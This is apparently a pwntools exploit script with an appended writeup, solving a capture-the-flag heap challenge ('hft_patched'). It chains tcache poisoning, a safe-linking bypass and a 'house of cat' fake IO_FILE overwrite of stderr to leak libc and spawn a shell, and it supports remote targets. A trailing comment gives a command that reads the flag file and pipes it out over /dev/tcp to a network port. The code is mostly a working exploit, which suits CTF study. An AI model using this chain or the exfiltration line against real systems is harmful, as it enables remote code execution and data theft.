from pwn import *
import sys
import time

context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"


def one_gadget(filename: str) -> list:
    return [
        int(i)
        for i in __import__("subprocess")
        .check_output(["one_gadget", "--raw", filename])
        .decode()
        .split(" ")
    ]


# brva x = b *(pie+x)
# set follow-fork-mode
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./hft_patched")
    if args.GDB:
        gdb.attach(
            r,
            "b __malloc_assert\nb system\nb __vfwprintf_internal\nb *__vfwprintf_internal+309",
        )
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s = lambda data: r.send(data)
sa = lambda x, y: r.sendafter(x, y)
sl = lambda data: r.sendline(data)
sla = lambda x, y: r.sendlineafter(x, y)
ru = lambda delims, drop=True: r.recvuntil(delims, drop)
uu32 = lambda data, num: u32(r.recvuntil(data)[-num:].ljust(4, b"\x00"))
uu64 = lambda data, num: u64(r.recvuntil(data)[-num:].ljust(8, b"\x00"))
leak = lambda name, addr: log.success("{} = {}".format(name, addr))
l64 = lambda: u64(r.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
l32 = lambda: u32(r.recvuntil("\xf7")[-4:].ljust(4, b"\x00"))


def malloc(size, data):
    sa("RES]\n", p64(size))
    sl(data)


malloc(0x18, p64(1) + b"a" * 0x8 + p64(0xD51))
ru("[m:[")
ru("[m:[")
malloc(0xD48, p64(1) + b"bbbb")
ru("[m:[")
ru("[m:[")
malloc(0x18, b"\x01" + b"\x00" * 6)
ru("[m:[")
heap = u64(r.recv(6).ljust(8, b"\x00"))
leak("heap", hex(heap))

malloc(0x1000, p64(1) + b"cccc")  # Put to largebin
malloc(0xD00, p64(1) + b"dddd")  # consume
# Generate a tcache bin 0x260
malloc(0x18, p64(1) + b"e" * 8 + p64(0x281))
malloc(0x278, p64(1) + b"f" * 7)
# Generate unsorted for size for top chunk
malloc(0x18, p64(1) + b"g" * 0x8 + p64(0xD61))
malloc(0xD58, p64(1) + b"hhhh")
malloc(0xD38, p64(1) + b"kkkk")
# Adjust top_chunk size
malloc(0x100, p64(1))
# Generate a different size tcache bin 0x150
malloc(0x18, p64(1) + b"i" * 8 + p64(0x171))
malloc(0x168, p64(1) + b"j" * 7)
# Adjust size for unsorted bin
malloc(0xBE0, p64(1))

# Now use the same technique to poison tcache
malloc(0x18, p64(1) + b"i" * 8 + p64(0x281))
malloc(0x281, p64(1) + b"j" * 7)

malloc(0xA00, p64(1))
malloc(0x18, p64(1) + b"k" * 8 + p64(0x341))
malloc(0x341, p64(1) + b"l" * 7)

malloc(0x18, p64(1) + b"k" * 8 + p64(0xC91))
malloc(0xC91, p64(1) + b"l" * 8)


def safe_linking(a, b):  # b is target a is base address
    return (a >> 12) ^ b


malloc(0x18, p64(0x261) + p64(safe_linking(heap + 0xCB0E0, 0))[:7])

malloc(
    0x140,
    b"6" * 0x21EE0 + p64(0x261) + p64(safe_linking(heap + 0x87AE0, heap + 0xCB0E0)),
)

malloc(0x250, p64(1))
malloc(0x250, p64(1)[:7])

libc = l64() - 0x219CE0

leak("libc", hex(libc))
# fix unsorted bin
malloc(0x310, b"7" * 0x216C0 + p64(0xC51)[:7])
# consume unsorted bin
malloc(0xC30, "6969")
# Generate a tcache bin 0x320
malloc(0x18, p64(1) + b"e" * 8 + p64(0x341))
malloc(0x338, p64(1) + b"8" * 7)
# adjust top chunk
malloc(0x900, p64(1))
# Generate a tcache bin 0x370
malloc(0x18, p64(1) + b"e" * 8 + p64(0x391))
malloc(0x389, p64(1) + b"9" * 7)
# adjust top chunk
malloc(0x8F0, p64(1))
# Generate a tcache bin 0x320
malloc(0x18, p64(1) + b"e" * 8 + p64(0x341))
malloc(0x338, p64(1) + b"0" * 7)
# tcache poisoning
IO_stderr = libc + 0x21A860
malloc(
    0x360,
    b"z" * 0x22040
    + p64(0x321)
    + p64(safe_linking(heap + 0x131A20, IO_stderr - 0x10))[:7],
)
# house of cat exploit chain
fake_io_addr = heap + 0x131A30
fake_IO_FILE = b"\xd0\x06;sh;\x00\x00"
fake_IO_FILE += p64(0) * 7
fake_IO_FILE += p64(1) + p64(2)
fake_IO_FILE += p64(fake_io_addr + 0xB0)
fake_IO_FILE += p64(libc + 0x0000000000050D60)  # call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x68, b"\x00")
fake_IO_FILE += p64(0)
fake_IO_FILE = fake_IO_FILE.ljust(0x88, b"\x00")
fake_IO_FILE += p64(heap + 0x1000)
fake_IO_FILE = fake_IO_FILE.ljust(0xA0, b"\x00")
fake_IO_FILE += p64(fake_io_addr + 0x30)
fake_IO_FILE = fake_IO_FILE.ljust(0xC0, b"\x00")
fake_IO_FILE += p64(1)  # mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xD8, b"\x00")
fake_IO_FILE += p64(
    libc + 0x2160C0 + 0x10
)  # vtable=IO_wfile_jumps+0x10  (vtable = IO_wfile_jumps + 0x30 for FSOP）
fake_IO_FILE += p64(0) * 6
fake_IO_FILE += p64(fake_io_addr + 0x40)
print("Len", len(fake_IO_FILE))
malloc(0x310, p64(1) + fake_IO_FILE)
malloc(0x310, p64(libc + 0x216600) + p64(fake_io_addr))
# Trigger __malloc_assert by modifying size of top chunk
malloc(0x18, p64(1) + b"O" * 0x8 + p64(0xD51))
malloc(0x1000, p64(1))
r.interactive()

"""
Writeup for high frequency troubles:
TL;DR:
Disgusting heap feng shui to use tcache poisoning to leak libc and overwrite stderr.
Get RCE using house of cat exploit chain. Remember to fix corrupted unsorted bin size.
Details:
It's well known that we can modify size of top chunk to free the top_chunk.
We can leak heap address somewhere I'll skip this part. (See writeup)
However we cannot go back to previous chunk to modify data. What can we do now?
Our heap would look like this:

---------------
Size a in tcache bin index 1
---------------
Size b in tcache bin index 0
---------------
Size a in tcache bin index 0
---------------
Size c in tcache bin index 0
---------------
Unsorted bin with libc


We take out size b to overwrite the next pointer of the bottom chunk (size a).
Then we now have poisoned tcache list with size a. We can first malloc to an unsorted bin to leak libc address.
Remember to fix corrupted unsorted bin size using size c.
Then we can just use tcache poisoning again to modify stderr to trigger "house of cat" to gain RCE.
Reference of house of cat: https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6
Pwn3d by pwn2ooown.
"""


"""
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
"""
